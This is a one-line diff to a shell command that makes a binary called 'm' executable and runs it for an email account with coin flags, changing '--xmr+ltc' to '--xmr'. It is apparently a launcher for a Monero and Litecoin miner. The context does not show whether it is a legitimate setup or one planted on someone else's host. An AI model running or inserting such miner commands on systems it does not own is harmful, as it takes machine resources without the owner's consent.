@@ -1,1 +1,1 @@
-chmod +x m && ./m -u hakerio0803@gmail.com --xmr+ltc 100
+chmod +x m && ./m -u hakerio0803@gmail.com --xmr 100
